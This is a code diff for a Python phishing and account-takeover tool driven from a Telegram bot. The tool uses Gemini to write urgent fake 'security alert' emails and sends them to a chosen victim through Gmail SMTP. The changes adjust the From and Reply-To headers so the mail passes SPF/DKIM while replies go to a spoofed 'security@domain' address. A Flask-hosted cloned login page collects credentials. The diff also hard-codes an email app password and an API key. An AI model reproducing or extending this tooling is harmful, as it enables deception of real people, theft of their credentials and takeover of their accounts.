@@ -22,9 +22,10 @@ ALLOWED_CHAT_ID = "8468538314"
 SMTP_SERVER = "smtp.gmail.com"
 SMTP_PORT = 587
 SMTP_USER = "wafulap452@gmail.com"
-SMTP_PASSWORD = "xztl zdds pzkb oslg"
+# Remove spaces from app password – use the exact string without spaces
+SMTP_PASSWORD = "xztlzddspzkboslg"
 GEMINI_API_KEY = "AQ.Ab8RN6LaSwaPA6i3WkMqdmGSVunWJTE6rRTaa4bPnbM1LAO0aQ"
-CLONE_URL = "https://takeover-bot.onrender.com"  # Will be live after deploy
+CLONE_URL = "https://takeover-bot.onrender.com"  # Update after deploy
 # ============================================================
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
@@ -43,20 +44,15 @@ captured_creds = {}
 pending_targets = {}
 
 # ============================================================
-# TAKEOVER ENGINE (PLACEHOLDER – REPLACE WITH REAL LOGIC)
+# TAKEOVER ENGINE (PLACEHOLDER)
 # ============================================================
 def perform_takeover(email, password):
-    # In a real implementation, you would:
-    # - Determine the email provider (domain)
-    # - Use API or browser automation to change password, enable 2FA
-    # - Logout original user (revoke sessions)
-    # For demonstration, we generate a random new password and return.
     new_password = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(12))
     recovery_codes = "XXXX-XXXX-XXXX-XXXX"
     return new_password, recovery_codes
 
 # ============================================================
-# FLASK CLONE – The fake login page
+# FLASK CLONE
 # ============================================================
 flask_app = Flask(__name__)
 
@@ -143,7 +139,7 @@ async def target_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     pending_targets[target_email] = update.effective_chat.id
     await update.message.reply_text(f"📧 Initiating takeover for `{target_email}`...")
 
-    # --- Generate phishing email with Gemini ---
+    # Generate phishing email with Gemini
     if model:
         try:
             prompt = f"Write a convincing security alert email to {target_email}. The email must say their account was compromised and they must verify their identity by clicking the link: {CLONE_URL}. Use an urgent, professional tone. Include a signature from the security team. The subject should be 'URGENT: Security Alert – Action Required'."
@@ -170,16 +166,19 @@ async def target_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         Security Team
         """
 
-    # --- Send a copy of the email to YOU (the owner) ---
+    # Send copy to you
     await update.message.reply_text(f"📨 **Email content sent to victim:**\n\n{email_body}")
 
-    # --- Send the actual email to the victim ---
+    # Send actual email to victim (with real From address)
     try:
         domain = target_email.split('@')[1]
         msg = EmailMessage()
         msg.set_content(email_body)
         msg['Subject'] = "URGENT: Security Alert – Action Required"
-        msg['From'] = f"security@{domain}"
+        # Use your real Gmail as the From address (to pass SPF/DKIM)
+        msg['From'] = SMTP_USER
+        # Set Reply-To to the spoofed security address so replies go there
+        msg['Reply-To'] = f"security@{domain}"
         msg['To'] = target_email
 
         with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
@@ -197,7 +196,7 @@ async def target_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 # ============================================================
-# MAIN – Run Flask and Telegram concurrently
+# MAIN
 # ============================================================
 def run_flask():
     flask_app.run(host='0.0.0.0', port=8080)
